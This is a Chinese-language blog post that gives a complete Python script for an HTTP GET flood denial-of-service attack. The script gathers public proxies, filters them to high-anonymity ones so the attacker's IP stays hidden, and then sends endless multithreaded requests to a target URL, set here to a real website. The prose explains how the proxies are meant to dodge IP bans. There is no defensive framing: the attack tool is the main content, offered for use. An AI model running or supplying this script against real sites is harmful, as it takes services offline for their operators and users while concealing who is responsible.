---
title: http_get_flood攻击
date: 2018-10-08
tags: [网络,python]
---

内容: http_get攻击代码和解释

精华: 完全原创,纯手打代码

<!-- more -->

# 概述

就是简单的请求接口, 复杂点就要伪造下headers, cookies, 不需要大流量, 所以连多线程都可以不要, 但有一点要注意

因为http\_get\_flood需要建立完整的tcp连接, 作为正常用户来访问网站, 所以会暴露自身ip, 可能被封ip

但是不能像syn_flood/udp_flood/icmp_flood那样直接修改源ip, 因为这仨不需要建立连接, 这么做的话服务器返回值都找不到我, 就建立不了连接

所以就得通过代理ip来做, 既能建立连接, 又能隐藏自身ip

# 流程

1. 通过这个api获取代理ip, https://raw.githubusercontent.com/fate0/proxylist/master/proxy.list
2. 清洗掉无效的, 非高匿的, 高延迟的
3. http\_get\_flood

# 代码

```python
#######################################
# 1. 获取代理ip
# 2. 清洗掉无效的, 非高匿的, 高延迟的
# 3. http_get_flood
#######################################

import requests
import threading
import traceback
import random

# 代理ip列表
proxy_list = []
# 线程数
thread_num = 10
# 攻击对象
url = "http://www.baidu.com"
# headers
headers = None
# cookies
cookies = None


def get_proxy():
    """
    获取代理ip
    """
    try:
        # 原始代理ip列表, 包含很多信息, str类型
        ips_raw = requests.get("https://raw.githubusercontent.com/fate0/proxylist/master/proxy.list", timeout=10)
        # 分行
        ip_list_raw = ips_raw.text.split("\n")
        # 删除结尾空行
        del(ip_list_raw[-1])

        ip_list = []
        for ip_raw in ip_list_raw:
            ip_raw = eval(ip_raw)
            # 只要高匿代理
            if ip_raw["anonymity"] != "high_anonymous":
                continue
            dic = {}
            dic[ip_raw["type"]] = ip_raw["host"] + ":" + str(ip_raw["port"])
            ip_list.append(dic)
        return(ip_list)
    except:
        print("获取代理ip失败")
        traceback.print_exc()
        return False


def check_proxies(ip_list):
    """
    清洗代理ip
    """
    # ip_list为清洗前的, proxy_list为清洗后的
    global proxy_list
    threads = []
    for ip in ip_list:
        t = threading.Thread(target=check_proxy, args=(ip,))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()
    print("清洗前代理ip数: " + str(len(ip_list)))
    print("清洗后代理ip数: " + str(len(proxy_list)))


def check_proxy(ip):
    """
    清洗代理ip
    """
    global proxy_list
    try: 
        res = requests.get("http://www.baidu.com", proxies=ip, timeout=1)
        if res.status_code == 200:
            proxy_list.append(ip)
            print("ok: " + str(ip))
        else:
            print("no: " + str(ip))
    except:
        return


def http_get_flood():
    """
    http_get_flood攻击
    """
    global url, proxy_list, headers, cookies
    while True:
        try:
            res = requests.get(url, proxies=random.choice(proxy_list), headers=headers, cookies=cookies)
            print(res.status_code)
        except:
            pass


# 获取代理ip
ip_list = get_proxy()
# 清洗代理ip
check_proxies(ip_list)
# http_get_flood
threads = []
for i in range(thread_num):
    t = threading.Thread(target=http_get_flood)
    threads.append(t)
    t.start()
for t in threads:
    t.join()

```

# 参考资料

[代理ip接口](https://raw.githubusercontent.com/fate0/proxylist/master/proxy.list)